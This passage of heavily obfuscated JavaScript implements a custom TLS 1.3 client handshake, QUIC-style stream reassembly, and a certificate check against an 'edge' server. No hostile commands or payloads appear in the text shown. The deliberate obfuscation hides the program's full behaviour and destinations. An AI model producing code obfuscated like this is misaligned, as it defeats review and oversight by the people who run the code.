                'tnPQV': function (c, d, f) {
                    return c(d, f);
                }
            };
        for (const c of a) {
            if (!c[hq(0xcfc)]) {
                c[hq(0xbea)] && this['fin'] && (this[hq(0x31b)] = !![]);
                continue;
            }
            this[hq(0x5bf)] = b[hq(0x81d)](a0bp, this[hq(0x5bf)], c[hq(0x1c6)], c[hq(0x1c6)] + c[hq(0xcfc)]), this[hq(0xb0e)] = b[hq(0x975)](a0bq, this['pending'], [{
                    'start': c['start'],
                    'length': c[hq(0xcfc)]
                }])[hq(0x97b)]((d, f) => d[hq(0x1c6)] - f[hq(0x1c6)]);
        }
    }
    ['idle']() {
        const hr = a0c4;
        return !this[hr(0xb0e)][hr(0xcfc)] && !this[hr(0x5bf)][hr(0xcfc)] && !this[hr(0x31b)];
    }
}
class a0bs {
    constructor() {
        const hs = a0c4;
        this[hs(0x30d)] = 0x0, this['pending'] = [];
    }
    [a0c4(0x34f)](a, b) {
        const ht = a0c4, c = {
                'rqHpJ': function (f, g) {
                    return f - g;
                },
                'aBrvX': function (f, g) {
                    return f < g;
                },
                'zbcHi': function (f, g) {
                    return f === g;
                }
            };
        if (a > this[ht(0x30d)] + 0x100000)
            return Buffer[ht(0x9b5)](0x0);
        if (a < this[ht(0x30d)]) {
            const f = c[ht(0xcb9)](this[ht(0x30d)], a);
            if (f >= b[ht(0xcfc)])
                return Buffer['alloc'](0x0);
            b = b[ht(0xd15)](f), a = this['contiguous'];
        }
        if (!b[ht(0xcfc)])
            return Buffer['alloc'](0x0);
        if (a !== this['contiguous'])
            return this[ht(0xb0e)][ht(0x21f)]({
                'start': a,
                'bytes': Buffer['from'](b)
            }), Buffer[ht(0x9b5)](0x0);
        const d = [b];
        this['contiguous'] += b[ht(0xcfc)];
        for (let g = !![]; g;) {
            g = ![];
            for (let h = 0x0; c[ht(0x3c0)](h, this['pending'][ht(0xcfc)]); h++) {
                if (c[ht(0x9f4)](this[ht(0xb0e)][h]['start'], this[ht(0x30d)])) {
                    d[ht(0x21f)](this[ht(0xb0e)][h][ht(0xd52)]), this['contiguous'] += this[ht(0xb0e)][h][ht(0xd52)][ht(0xcfc)], this['pending'][ht(0xb88)](h, 0x1), g = !![];
                    break;
                }
            }
        }
        return Buffer[ht(0x6ef)](d);
    }
}
function a0bt(a, b, c, d) {
    const hu = a0c4, f = {
            'Qjleq': function (j, k) {
                return j < k;
            },
            'Ylpph': function (j, k) {
                return j + k;
            },
            'LORzK': function (j, k) {
                return j + k;
            },
            'UzYlm': function (j, k) {
                return j + k;
            },
            'LLBVy': function (j, k) {
                return j < k;
            },
            'xNKLK': function (j, k) {
                return j + k;
            }
        };
    if (f[hu(0xce4)](b[hu(0xcfc)], f['Ylpph'](f[hu(0x7d2)](c, 0x4), a0b4)))
        return null;
    const g = a[hu(0x1ef)](b[hu(0xd15)](f[hu(0x41c)](c, 0x4), f['LORzK'](c + 0x4, a0b4))), h = Buffer[hu(0x581)](b);
    h[0x0] ^= g[0x0] & (d ? 0xf : 0x1f);
    for (let j = 0x0; f[hu(0x8d2)](j, a0b5); j++) {
        h[f[hu(0xb0a)](c, j)] ^= g[f['Ylpph'](0x1, j)];
    }
    return h;
}
function a0bu(a, b, c, d) {
    const hv = a0c4, f = {
            'xnvtJ': function (l, m) {
                return l < m;
            },
            'McOFc': function (l, m) {
                return l + m;
            },
            'eoFPZ': function (l, m) {
                return l + m;
            },
            'aVuFT': function (l, m) {
                return l + m;
            },
            'srhnO': function (l, m) {
                return l & m;
            },
            'SYSsn': function (l, m) {
                return l + m;
            },
            'Ajyuj': function (l, m) {
                return l < m;
            }
        };
    if (f[hv(0xaa5)](b[hv(0xcfc)], f['McOFc'](f['McOFc'](c, 0x4), a0b4)))
        return null;
    const g = a[hv(0x1ef)](b['subarray'](f[hv(0xd41)](c, 0x4), f[hv(0x551)](f[hv(0xd41)](c, 0x4), a0b4))), h = Buffer['from'](b);
    h[0x0] ^= f[hv(0x4e4)](g[0x0], d ? 0xf : 0x1f);
    const j = f[hv(0x2f4)](f[hv(0x4e4)](h[0x0], 0x3), 0x1);
    for (let l = 0x0; f['Ajyuj'](l, j); l++) {
        h[f['SYSsn'](c, l)] ^= g[f[hv(0x2f4)](0x1, l)];
    }
    let k = 0x0;
    for (let m = 0x0; f[hv(0xaa5)](m, j); m++) {
        k = f[hv(0x551)](k * 0x100, h[f[hv(0x551)](c, m)]);
    }
    return [
        h[hv(0xd15)](0x0, f[hv(0xd41)](c, j)),
        k
    ];
}
function a0bv(a, b, c) {
    const hw = a0c4, d = {
            'CExlJ': function (j, k) {
                return j + k;
            },
            'NNiIa': function (j, k) {
                return j(k);
            },
            'FXmFZ': function (j, k) {
                return j - k;
            },
            'dNuIn': function (j, k) {
                return j | k;
            },
            'nSiUS': function (j, k) {
                return j & k;
            },
            'DnoWb': function (j, k) {
                return j << k;
            },
            'MaJFM': function (j, k) {
                return j - k;
            },
            'pydik': function (j, k) {
                return j + k;
            },
            'aRmxp': function (j, k) {
                return j > k;
            },
            'osNJs': function (j, k) {
                return j << k;
            },
            'dmCvC': function (j, k) {
                return j(k);
            },
            'hVIVg': function (j, k) {
                return j(k);
            }
        }, f = d[hw(0x888)](d['NNiIa'](BigInt, a), 0x1n), g = d['FXmFZ'](0x1n << d[hw(0x391)](BigInt, b), 0x1n);
    let h = d['dNuIn'](d[hw(0x655)](f, ~g), d['NNiIa'](BigInt, c));
    const i = d['DnoWb'](0x1n, BigInt(d[hw(0x2a0)](b, 0x1)));
    if (d[hw(0x419)](h, i) <= f)
        h += d[hw(0xd4c)](0x1n, BigInt(b));
    else
        d[hw(0x625)](h, d[hw(0x888)](f, i)) && h >= d[hw(0x339)](0x1n, d['dmCvC'](BigInt, b)) && (h -= d['osNJs'](0x1n, BigInt(b)));
    return d['hVIVg'](Number, h);
}
function a0bw(a) {
    const hx = a0c4, b = {
            'LnCix': function (j, k) {
                return j - k;
            },
            'NDZHa': function (j, k) {
                return j - k;
            },
            'YKMlr': function (j, k) {
                return j >= k;
            },
            'oaqjc': function (j, k) {
                return j - k;
            }
        }, c = new a0bh();
    c[hx(0x405)](a0bc[hx(0x3fd)]);
    const d = a[hx(0xa40)]()['sort']((j, k) => j['start'] - k['start']), f = d[b[hx(0x7af)](d[hx(0xcfc)], 0x1)], g = b[hx(0x1b3)](f[hx(0x1c6)] + f[hx(0xcfc)], 0x1);
    c[hx(0x2e4)](g), c['varint'](0x0), c[hx(0x2e4)](d['length'] - 0x1), c[hx(0x2e4)](g - f[hx(0x1c6)]);
    let h = f['start'];
    for (let j = b[hx(0x1b3)](d[hx(0xcfc)], 0x2); b['YKMlr'](j, 0x0); j--) {
        const k = d[j], l = b[hx(0x1b3)](k[hx(0x1c6)] + k[hx(0xcfc)], 0x1);
        c[hx(0x2e4)](b[hx(0x3cf)](b[hx(0x1b3)](h, l), 0x2)), c['varint'](b[hx(0x3cf)](l, k['start'])), h = k[hx(0x1c6)];
    }
    return c[hx(0x68f)]();
}
function a0bx(a) {
    const hy = a0c4, b = {
            'wKcfy': function (k, l) {
                return k - l;
            },
            'lSxFh': function (k, l) {
                return k < l;
            },
            'tVrGb': function (k, l) {
                return k - l;
            },
            'Yeymk': function (k, l) {
                return k - l;
            },
            'PblGo': function (k, l) {
                return k + l;
            },
            'XRShw': function (k, l) {
                return k / l;
            }
        }, c = a[hy(0x469)](), d = a[hy(0x469)](), f = a[hy(0x469)](), g = a[hy(0x469)](), h = [{
                'start': b[hy(0x558)](c, g),
                'length': g + 0x1
            }];
    let j = b[hy(0x558)](c, g);
    for (let k = 0x0; b[hy(0x6a7)](k, f); k++) {
        const l = a[hy(0x469)](), m = a[hy(0x469)](), n = b[hy(0x669)](j - l, 0x2);
        h[hy(0x21f)]({
            'start': b['Yeymk'](n, m),
            'length': b[hy(0xaa1)](m, 0x1)
        }), j = n - m;
    }
    return h[hy(0x592)] = b[hy(0x584)](d, 0x3e8), h;
}
function a0by(a) {
    const hz = a0c4, b = {
            'mglVn': function (f, g) {
                return f > g;
            },
            'CmKjr': function (f, g) {
                return f(g);
            },
            'JyriS': function (f, g) {
                return f === g;
            },
            'ecZRS': function (f, g) {
                return f === g;
            },
            'afgcQ': function (f, g) {
                return f === g;
            },
            'bCLZK': function (f, g) {
                return f + g;
            },
            'tBoLm': function (f, g) {
                return f * g;
            }
        }, c = {}, d = new a0bi(a);
    while (b[hz(0x448)](d['remaining'], 0x0)) {
        const f = b['CmKjr'](Number, d['varint']()), g = d['number']();
        if (d[hz(0xb4c)] < g)
            break;
        const h = d[hz(0xd52)](g);
        if (b[hz(0xb25)](h[hz(0xcfc)], 0x1) || b[hz(0xb25)](h[hz(0xcfc)], 0x2) || b[hz(0x8b7)](h[hz(0xcfc)], 0x4) || b[hz(0x776)](h[hz(0xcfc)], 0x8)) {
            let i = 0x0;
            for (const j of h) {
                i = b[hz(0x8c9)](b['tBoLm'](i, 0x100), j);
            }
            c[f] = i;
        } else
            c[f] = Buffer[hz(0x581)](h);
    }
    return c;
}
function a0bz(a) {
    const hA = a0c4, b = {
            'bOeLc': function (d, f) {
                return d(f);
            }
        }, c = new a0bh();
    for (const [d, f] of a) {
        let g;
        if (Buffer[hA(0xb1d)](f))
            g = f;
        else
            f === !![] ? g = Buffer[hA(0x9b5)](0x0) : g = b[hA(0x890)](a0bf, f);
        c[hA(0x2e4)](d), c['varint'](g['length']), c[hA(0xd52)](g);
    }
    return c[hA(0x68f)]();
}
function a0bA(a, b) {
    const hB = a0c4, c = Buffer['alloc'](0x4);
    return c[0x0] = a, c[hB(0x57b)](b[hB(0xcfc)], 0x1, 0x3), Buffer[hB(0x6ef)]([
        c,
        b
    ]);
}
function a0bB(a, b) {
    const hC = a0c4, c = Buffer[hC(0x9b5)](0x4);
    return c[hC(0x250)](a, 0x0), c[hC(0x250)](b[hC(0xcfc)], 0x2), Buffer[hC(0x6ef)]([
        c,
        b
    ]);
}
class a0bC {
    constructor(a, b, c) {
        const hD = a0c4, d = {
                'XNUzr': hD(0x736),
                'ElhpZ': hD(0x3b3),
                'LwKTa': hD(0xb9b),
                'eGDZV': hD(0x385)
            }, f = d[hD(0x2e2)][hD(0x3ff)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[hD(0x5d1)] = a0k[hD(0x62c)](d[hD(0x834)]);
                continue;
            case '1':
                this['leafCert'] = null;
                continue;
            case '2':
                this[hD(0x9bc)] = d['LwKTa'];
                continue;
            case '3':
                this[hD(0xa67)] = hD(0x1c6);
                continue;
            case '4':
                this[hD(0x3ab)] = null;
                continue;
            case '5':
                this['parameters'] = c;
                continue;
            case '6':
                this[hD(0x7e2)] = a;
                continue;
            case '7':
                this[hD(0x493)] = b;
                continue;
            case '8':
                this['hash'] = d['eGDZV'];
                continue;
            case '9':
                this[hD(0xdac)] = null;
                continue;
            case '10':
                this['hashLength'] = 0x20;
                continue;
            case '11':
                this[hD(0x28a)] = [];
                continue;
            case '12':
                this[hD(0x560)] = this[hD(0x5d1)]['publicKey']['export']({
                    'type': hD(0x7c0),
                    'format': hD(0x270)
                })[hD(0xd15)](-0x20);
                continue;
            }
            break;
        }
    }
    [a0c4(0xc0a)](a) {
        const hE = a0c4, b = a0k[hE(0x631)](this['hash']), c = a === undefined ? this[hE(0x28a)] : this['messages']['slice'](0x0, a);
        for (const d of c) {
            b[hE(0x954)](d);
        }
        return b[hE(0x3a0)]();
    }
    [a0c4(0x409)]() {
        const hF = a0c4, a = {
                'vwzIj': 'utf8',
                'aPRxe': function (p, q) {
                    return p + q;
                },
                'wszmM': function (p, q, r) {
                    return p(q, r);
                },
                'CmzLT': function (p, q, r) {
                    return p(q, r);
                },
                'pbVDe': function (p, q, r) {
                    return p(q, r);
                },
                'UPLRZ': function (p, q, r) {
                    return p(q, r);
                },
                'TzoAu': function (p, q) {
                    return p & q;
                },
                'jFKgz': function (p, q) {
                    return p & q;
                },
                'APuyl': 'awaiting-server-hello'
            }, b = Buffer['from'](this[hF(0x7e2)], a[hF(0x3f3)]), c = new a0bh()[hF(0xad4)](b[hF(0xcfc)] + 0x3)[hF(0x405)](0x0)[hF(0xad4)](b[hF(0xcfc)])[hF(0xd52)](b)[hF(0x68f)](), d = new a0bh()[hF(0xad4)](0x4)[hF(0xad4)](0x1d)[hF(0xad4)](0x17)['build'](), f = new a0bh()['u16'](0x8)[hF(0xad4)](0x403)[hF(0xad4)](0x804)[hF(0xad4)](0x401)[hF(0xad4)](0x807)[hF(0x68f)](), g = new a0bh()[hF(0x405)](0x2)[hF(0xad4)](0x304)[hF(0x68f)](), h = new a0bh()[hF(0xad4)](a[hF(0x45f)](0x4, this[hF(0x560)][hF(0xcfc)]))[hF(0xad4)](0x1d)[hF(0xad4)](this[hF(0x560)][hF(0xcfc)])[hF(0xd52)](this[hF(0x560)])[hF(0x68f)](), i = Buffer[hF(0x6ef)]([
                Buffer[hF(0x581)]([this[hF(0x493)][hF(0xcfc)]]),
                Buffer['from'](this['alpn'], a['vwzIj'])
            ]), j = new a0bh()[hF(0xad4)](i['length'])[hF(0xd52)](i)['build'](), k = new a0bh()['byte'](0x1)[hF(0x405)](0x1)[hF(0x68f)](), l = Buffer[hF(0x6ef)]([
                a[hF(0x326)](a0bB, 0x0, c),
                a[hF(0x326)](a0bB, 0xa, d),
                a[hF(0x237)](a0bB, 0xd, f),
                a[hF(0x237)](a0bB, 0x2b, g),
                a[hF(0x326)](a0bB, 0x33, h),
                a[hF(0xcac)](a0bB, 0x10, j),
                a[hF(0x326)](a0bB, 0x2d, k),
                a[hF(0xc6e)](a0bB, 0xff01, Buffer[hF(0x581)]([0x0])),
                a0bB(0x39, this[hF(0xd1a)])
            ]), m = Buffer['from']([
                0x0,
                0x4,
                0x13,
                0x1,
                0x13,
                0x2
            ]), n = Buffer['concat']([
                Buffer[hF(0x581)]([
                    0x3,
                    0x3
                ]),
                a0k[hF(0xa8d)](0x20),
                Buffer[hF(0x581)]([0x0]),
                m,
                Buffer[hF(0x581)]([
                    0x1,
                    0x0
                ]),
                Buffer[hF(0x581)]([
                    a[hF(0xcc0)](l['length'] >> 0x8, 0xff),
                    a[hF(0x33a)](l['length'], 0xff)
                ]),
                l
            ]), o = a[hF(0xcac)](a0bA, 0x1, n);
        return this[hF(0x28a)][hF(0x21f)](o), this[hF(0xa67)] = a[hF(0xb2b)], o;
    }
    [a0c4(0x6e6)](a) {
        const hG = a0c4, b = {
                'urhMj': function (d, f) {
                    return d < f;
                },
                'TrYKe': function (d, f) {
                    return d !== f;
                },
                'eDxXt': hG(0x61a),
                'xzIWs': function (d, f) {
                    return d + f;
                }
            };
        if (b[hG(0x715)](a[hG(0xcfc)], 0x4))
            return null;
        if (b[hG(0x2d7)](a[0x0], 0x2))
            throw new Error(b[hG(0xcfe)]);
        const c = a['readUIntBE'](0x1, 0x3);
        if (a[hG(0xcfc)] < 0x4 + c)
            return null;
        return a[hG(0xd15)](0x0, b[hG(0x5bd)](0x4, c));
    }
    ['handleServerHello'](a) {
        const hH = a0c4, b = {
                'ighcV': 'edge\x20requested\x20a\x20HelloRetryRequest,\x20which\x20is\x20not\x20supported',
                'Drocg': function (q, r) {
                    return q < r;
                },
                'vVbDd': function (q, r) {
                    return q >= r;
                },
                'ztYXA': function (q, r) {
                    return q === r;
                },
                'YwRjS': function (q, r) {
                    return q >= r;
                },
                'ragxN': function (q, r) {
                    return q !== r;
                },
                'TsSGh': hH(0x966),
                'hWhDj': function (q, r) {
                    return q === r;
                },
                'EgIkK': function (q, r) {
                    return q !== r;
                },
                'oDQbN': function (q, r) {
                    return q === r;
                },
                'BIlEx': hH(0x385),
                'IvEKk': hH(0xb9b),
                'SRrSZ': hH(0x6a8),
                'MsLst': function (q, r) {
                    return q + r;
                },
                'gUmBZ': hH(0x298),
                'MhREl': hH(0x914),
                'fbrtL': hH(0xd47),
                'AtNmW': hH(0x270),
                'SjAbM': 'spki',
                'bTaBS': function (q, r, s, t) {
                    return q(r, s, t);
                },
                'TGHdT': function (q, r, s, t, u, v) {
                    return q(r, s, t, u, v);
                },
                'BGBeD': 'derived',
                'RYxhN': function (q, r, s, t, u, v) {
                    return q(r, s, t, u, v);
                },
                'xDGqE': hH(0x846),
                'gPQHn': function (q, r, s, t, u, v) {
                    return q(r, s, t, u, v);
                },
                'rFIYW': 's\x20hs\x20traffic'
            }, c = new a0bi(a[hH(0xd15)](0x4));
        c[hH(0xad4)]();
        const d = c[hH(0xd52)](0x20);
        if (d[hH(0x4e7)](a0b3))
            throw new Error(b[hH(0x9b0)]);
        const f = c[hH(0xd52)](c['byte']()), g = c['u16']();
        c[hH(0x405)]();
        let h = null;
        const i = c[hH(0xad4)]();
        let j = 0x0;
        while (b['Drocg'](j, i) && b[hH(0x90d)](c['remaining'], 0x4)) {
            const q = c[hH(0xad4)](), r = c[hH(0xad4)](), s = c['bytes'](r);
            j += 0x1;
            if (b['ztYXA'](q, 0x33) && b[hH(0xb94)](s[hH(0xcfc)], 0x4)) {
                const t = new a0bi(s), u = t['u16'](), v = t[hH(0xad4)]();
                h = {
                    'group': u,
                    'key': t[hH(0xd52)](v)
                };
            } else {
                if (q === 0x2b && b[hH(0x90d)](s[hH(0xcfc)], 0x2)) {
                    if (b['ragxN'](s['readUInt16BE'](0x0), 0x304))
                        throw new Error(b[hH(0xc17)]);
                }
            }
        }
        if (b[hH(0x4f0)](h, null))
            throw new Error(hH(0x299));
        if (b[hH(0x600)](h[hH(0x947)], 0x1d))
            throw new Error(hH(0x205) + h['group']);
        if (b['oDQbN'](g, 0x1301))
            this[hH(0x371)] = b[hH(0xa11)], this[hH(0x247)] = 0x20, this['cipher'] = b['IvEKk'];
        else {
            if (b['hWhDj'](g, 0x1302))
                this[hH(0x371)] = hH(0x630), this[hH(0x247)] = 0x30, this['cipher'] = b[hH(0x2b3)];
            else
                throw new Error(b[hH(0x30c)](b['gUmBZ'], g[hH(0xa3c)](0x10)));
        }
        this[hH(0x28a)][hH(0x21f)](a);
        const k = a0k['createPublicKey']({
                'key': Buffer[hH(0x6ef)]([
                    Buffer['from'](b[hH(0x51c)], b['fbrtL']),
                    h[hH(0x577)]
                ]),
                'format': b[hH(0xcaa)],
                'type': b[hH(0x1e6)]
            }), l = a0k[hH(0x65d)]({
                'privateKey': this[hH(0x5d1)]['privateKey'],
                'publicKey': k
            }), m = Buffer[hH(0x9b5)](this['hashLength']), n = b[hH(0x757)](a0bj, this[hH(0x371)], m, m), o = b[hH(0x307)](a0bl, this[hH(0x371)], n, b['BGBeD'], a0k[hH(0x631)](this[hH(0x371)])['digest'](), this['hashLength']);
        this[hH(0x1af)] = b['bTaBS'](a0bj, this['hash'], o, l);
        const p = this[hH(0xc0a)]();
        return this[hH(0x6e8)] = b[hH(0x627)](a0bl, this[hH(0x371)], this[hH(0x1af)], b[hH(0xcb6)], p, this[hH(0x247)]), this['serverHandshakeSecret'] = b[hH(0xa22)](a0bl, this['hash'], this[hH(0x1af)], b[hH(0x48f)], p, this[hH(0x247)]), this[hH(0xa67)] = hH(0x33d), {
            'send': new a0bm(this[hH(0x371)], this[hH(0x9bc)], this['clientHandshakeSecret']),
            'recv': new a0bm(this[hH(0x371)], this[hH(0x9bc)], this['serverHandshakeSecret'])
        };
    }
    [a0c4(0x4be)](a) {
        const hI = a0c4, b = {
                'YmYFg': function (u, v) {
                    return u < v;
                },
                'rXttl': function (u, v) {
                    return u >= v;
                },
                'whtNg': function (u, v) {
                    return u === v;
                },
                'IysoI': function (u, v) {
                    return u(v);
                },
                'JPQPG': function (u, v) {
                    return u === v;
                },
                'fJZoL': hI(0x1bc),
                'LsznB': function (u, v) {
                    return u >= v;
                },
                'WfqkD': function (u, v) {
                    return u + v;
                },
                'qwEmW': function (u, v) {
                    return u <= v;
                },
                'ifCBb': function (u, v) {
                    return u <= v;
                },
                'EJgcW': function (u, v) {
                    return u + v;
                },
                'UlSjt': function (u, v) {
                    return u > v;
                },
                'AlBvL': function (u, v) {
                    return u + v;
                },
                'qTXQD': function (u, v) {
                    return u === v;
                },
                'pwoEK': function (u, v) {
                    return u - v;
                },
                'pqZac': function (u, v) {
                    return u - v;
                },
                'qOLRC': function (u, v, w, x, y, z) {
                    return u(v, w, x, y, z);
                },
                'PFIVy': 'finished',
                'HmDzV': function (u, v) {
                    return u === v;
                },
                'lBzBy': function (u, v, w) {
                    return u(v, w);
                },
                'lkAsU': function (u, v, w, x, y, z) {
                    return u(v, w, x, y, z);
                },
                'qpHBX': hI(0x8d5),
                'QPiRk': function (u, v, w, x) {
                    return u(v, w, x);
                },
                'OfFVe': function (u, v, w, x, y, z) {
                    return u(v, w, x, y, z);
                },
                'moolA': hI(0x7cd),
                'ZJFrW': function (u, v, w, x, y, z) {
                    return u(v, w, x, y, z);
                },
                'uNLbi': hI(0x773),
                'XHFGE': 'complete'
            };
        this[hI(0x28a)][hI(0x21f)](a);
        const c = a[0x0];
        if (c === 0x8) {
            const u = new a0bi(a[hI(0xd15)](0x4)), v = u[hI(0xad4)]();
            let w = 0x0;
            while (b[hI(0xd54)](w, v) && b[hI(0x9f6)](u['remaining'], 0x4)) {
                const x = u[hI(0xad4)](), y = u[hI(0xad4)](), z = u['bytes'](y);
                w += 0x1;
                if (b['whtNg'](x, 0x39))
                    this[hI(0x3ab)] = b['IysoI'](a0by, Buffer[hI(0x581)](z));
                else
                    b[hI(0xc63)](x, 0x10) && b[hI(0x9f6)](z[hI(0xcfc)], 0x3) && (this[hI(0xdac)] = z[hI(0xd15)](0x3)[hI(0xa3c)](b[hI(0x819)]));
            }
            return null;
        }
        if (b[hI(0xc63)](c, 0xb)) {
            const A = a[hI(0xd15)](0x4);
            if (b['LsznB'](A[hI(0xcfc)], 0x4)) {
                const B = b['WfqkD'](0x1, A[0x0]);
                if (b[hI(0x695)](B + 0x3, A[hI(0xcfc)])) {
                    const C = A[hI(0x904)](B, 0x3);
                    if (b[hI(0x418)](b[hI(0x80c)](b[hI(0x80c)](B, 0x3), C), A[hI(0xcfc)]) && b['LsznB'](C, 0x3)) {
                        const D = A[hI(0x904)](b[hI(0x62e)](B, 0x3), 0x3);
                        b[hI(0x6be)](D, 0x0) && b[hI(0x418)](b[hI(0x80c)](B, 0x6) + D, A[hI(0xcfc)]) && (this[hI(0x645)] = Buffer[hI(0x581)](A[hI(0xd15)](b[hI(0x62e)](B, 0x6), b[hI(0x80c)](b[hI(0x719)](B, 0x6), D))));
                    }
                }
            }
            return null;
        }
        if (b[hI(0x6e3)](c, 0xf) || b[hI(0xb22)](c, 0x4))
            return null;
        if (c !== 0x14)
            return null;
        const d = this[hI(0x28a)][b[hI(0xa90)](this['messages'][hI(0xcfc)], 0x1)], f = d[hI(0xd15)](0x4), g = this[hI(0xc0a)](b[hI(0x5e8)](this[hI(0x28a)][hI(0xcfc)], 0x1)), h = b['qOLRC'](a0bl, this[hI(0x371)], this[hI(0x84c)], b[hI(0xd64)], Buffer[hI(0x9b5)](0x0), this[hI(0x247)]), i = a0k[hI(0x66f)](this[hI(0x371)], h)['update'](g)[hI(0x3a0)](), j = b['HmDzV'](i[hI(0xcfc)], f[hI(0xcfc)]) && a0k[hI(0x5b2)](i, f), k = b[hI(0xac2)](a0bl, this[hI(0x371)], this[hI(0x6e8)], b[hI(0xd64)], Buffer[hI(0x9b5)](0x0), this[hI(0x247)]), l = this[hI(0xc0a)](), m = a0k[hI(0x66f)](this[hI(0x371)], k)[hI(0x954)](l)[hI(0x3a0)](), n = b[hI(0xaac)](a0bA, 0x14, m), o = Buffer['alloc'](this[hI(0x247)]), p = b[hI(0x510)](a0bl, this[hI(0x371)], this[hI(0x1af)], b[hI(0xb07)], a0k['createHash'](this[hI(0x371)])[hI(0x3a0)](), this['hashLength']), q = b['QPiRk'](a0bj, this[hI(0x371)], p, o), r = this['transcript']();
        this['messages'][hI(0x21f)](n);
        const s = b['OfFVe'](a0bl, this[hI(0x371)], q, b[hI(0x47f)], r, this[hI(0x247)]), t = b[hI(0xbe6)](a0bl, this[hI(0x371)], q, b[hI(0x358)], r, this[hI(0x247)]);
        return this[hI(0xa67)] = b[hI(0xda7)], {
            'verified': j,
            'finished': n,
            'send': new a0bm(this[hI(0x371)], this['cipher'], s),
            'recv': new a0bm(this[hI(0x371)], this[hI(0x9bc)], t)
        };
    }
}
function a0b(a, b) {
    a = a - 0x19e;
    const c = a0a();
    let d = c[a];
    if (a0b['RkZwcP'] === undefined) {
        var e = function (h) {
            const i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let j = '', l = '';
            for (let m = 0x0, n, o, p = 0x0; o = h['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? j += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                o = i['indexOf'](o);
            }
            for (let q = 0x0, r = j['length']; q < r; q++) {
                l += '%' + ('00' + j['charCodeAt'](q)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(l);
        };
        a0b['dUbQZg'] = e, a0b['woFuoA'] = {}, a0b['RkZwcP'] = !![];
    }
    const f = c[0x0];
    a0b['iKGFRO'] !== f && (a0b['woFuoA'] = {}, a0b['iKGFRO'] = f);
    const g = a0b['woFuoA'][a];
    return g === undefined ? (d = a0b['dUbQZg'](d), a0b['woFuoA'][a] = d) : d = g, d;
}
function a0bD(a) {
    const hJ = a0c4, b = {
            'KLvVh': hJ(0x842),
            'Hslru': function (k, l) {
                return k === l;
            },
            'SNVCf': hJ(0x75a),
            'IjuxT': 'no\x20edge\x20certificate\x20in\x20TLS\x20handshake',
            'iPPgq': function (k, l) {
                return k + l;
            },
            'kMGEq': hJ(0x1b1),
            'GFtLL': function (k, l) {
                return k(l);
            },
            'XFQPI': function (k, l) {
                return k(l);
            },
            'zPWrk': hJ(0xa77),
            'uGGCN': hJ(0x711),
            'bAfwg': hJ(0xab4),
            'hTVms': 'issuer\x20OU\x20mismatch:\x20',
            'dUyiw': hJ(0x8b5),
            'ZxJBE': function (k, l) {
                return k + l;
            },
            'lOIDV': hJ(0x490),
            'EdWvh': hJ(0xd4a)
        };
    if (!a || !a['length'])
        return b[hJ(0x827)];
    let c;
    try {
        c = new a0k['X509Certificate'](a);
    } catch (k) {
        return b[hJ(0x29d)](b[hJ(0x853)], k['message']);
    }
    const d = l => String(l || '')[hJ(0x1ad)](/\\,/g, ','), f = b[hJ(0x382)](d, c[hJ(0x789)]), g = b[hJ(0xb60)](d, c['subject']);
    if (!f[hJ(0x38b)](b[hJ(0x84f)]))
        return b[hJ(0x29d)](b[hJ(0x6b4)], f);
    if (!f[hJ(0x38b)](b[hJ(0x320)]))
        return b['hTVms'] + f;
    if (!g[hJ(0x38b)](b[hJ(0xc61)]))
        return b[hJ(0x9e3)](b[hJ(0x639)], g);
    const h = b[hJ(0x382)](String, c[hJ(0x867)] || '')['split'](',')[hJ(0x922)](l => l[hJ(0x7e4)]()['toLowerCase']()), i = b[hJ(0x85c)], j = h[hJ(0x3dd)](l => {
            const hK = hJ;
            if (!l[hK(0x6ec)](b[hK(0xa18)]))
                return ![];
            const m = l[hK(0xa40)](0x4);
            return m === i || b[hK(0x4b8)](m, b[hK(0x546)]) || m[hK(0x6ec)]('*.') && i[hK(0xd23)](m[hK(0xa40)](0x1));
        });
    if (!j)
        return b['ZxJBE'](hJ(0x977), b[hJ(0x382)](String, c[hJ(0x867)] || '')) + ')';
    return null;
}
class a0bE {
    constructor(a, b, c) {
        const hL = a0c4, d = { 'ODusZ': hL(0xc07) }, f = d[hL(0x586)][hL(0x3ff)]('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this['id'] = b;
                continue;
            case '1':
                this[hL(0x608)] = 0x0;
                continue;
            case '2':
                this[hL(0xab7)] = Buffer[hL(0x9b5)](0x0);
                continue;
            case '3':
                this[hL(0x767)] = 0x0;
                continue;
            case '4':
                this[hL(0x8c4)] = null;
                continue;
            case '5':
                this[hL(0xb57)] = 0x0;
                continue;
            case '6':
                this['receiver'] = new a0bs();
                continue;
            case '7':
                this[hL(0x521)] = a;
                continue;
            case '8':
                this[hL(0x781)] = a['localStreamData'];
                continue;
            case '9':
                this[hL(0x74d)] = ![];
                continue;
            case '10':
                this['initiator'] = c;
                continue;
            case '11':
                this['reset'] = ![];
                continue;
            case '12':
                this[hL(0x4db)] = new a0br(a);
                continue;
            }
            break;
        }
    }
    [a0c4(0x32b)](a, b) {
        const hM = a0c4, c = {
                'teNhf': function (d, f) {
                    return d(f);
                }
            };
        this['send'][hM(0x9f8)](a, c['teNhf'](Boolean, b)), this[hM(0x521)]['markSendReady'](this);
    }
}
class a0bF {
    constructor(a) {
        const hN = a0c4, b = {
                'wIjQS': function (c, d) {
                    return c === d;
                },
                'wgPdS': function (c, d) {
                    return c << d;
                },
                'EqQwa': function (c, d) {
                    return c << d;
                },
                'vkshm': function (c, d) {
                    return c * d;
                },
                'VDnIx': function (c, d) {
                    return c * d;
                }
            };
